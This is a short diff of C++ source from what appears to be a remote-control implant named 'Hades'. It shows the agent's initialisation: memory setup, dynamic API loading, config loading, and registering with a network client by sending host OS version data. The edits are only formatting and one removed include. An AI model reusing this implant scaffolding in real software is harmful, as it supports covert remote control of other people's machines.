@@ -1,7 +1,7 @@
 #include <WS2tcpip.h>
 #include <stdio.h>
 #include <iphlpapi.h>
-#include "../shared/common.hpp"
+
 #include "../utils/apidefs.hpp"
 #include "../utils/bytes.hpp"
 #include "../shared/nt.hpp"
@@ -139,12 +139,13 @@ ULONG GetPPID() {
 
 BOOL InitAgent() {
 	
-	hades		  =  AllocMemory <Hades>     (sizeof(Hades));
+	
+	hades         = AllocMemory<Hades>(sizeof(Hades));
 	g_ByteMgr     =  AllocMemory <bytes>     (sizeof(bytes));
 	g_Network	  =  AllocMemory <Network>   (sizeof(Network));
 	g_Commander	  =  AllocMemory <commanders>(sizeof(commanders));
-
-	if (!LoadAPIS())   { return FALSE; }
+	if (!LoadAPIS()) { return FALSE; }
+	
 	if (!LoadConfig()) { return FALSE; }
 	
 	
@@ -212,6 +213,7 @@ BOOL InitAgent() {
 	g_ByteMgr->Write4(Major);
 	g_ByteMgr->Write4(Build);
 	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
+
 	
 
 
